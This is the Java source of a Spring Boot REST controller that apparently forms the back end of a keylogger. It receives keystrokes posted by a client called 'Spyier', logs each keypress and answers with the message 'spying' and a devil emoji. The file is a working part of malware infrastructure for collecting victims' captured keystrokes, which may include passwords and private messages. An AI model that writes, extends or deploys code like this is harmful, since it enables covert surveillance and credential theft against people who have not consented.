package keylogger.backend.controllers;

import io.swagger.v3.oas.annotations.Operation;
import jakarta.validation.constraints.Null;
import keylogger.backend.dtos.payloads.KeyboardPayloadDto;
import keylogger.backend.dtos.responses.KeyboardResponseDto;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
@RequestMapping("/keyboard")
public class KeyboardController {
    @Operation(summary = "Handles keyboard logs sent by Spyier.")
    @PostMapping
    public ResponseEntity<KeyboardResponseDto> handleKeyboardLogs(@RequestBody KeyboardPayloadDto keyboardDto) {
        if (!keyboardDto.keypress().isEmpty()) {
            log.info(keyboardDto.keypress());
        }
        return ResponseEntity.ok(new KeyboardResponseDto("spying \uD83D\uDE08"));
    }
}
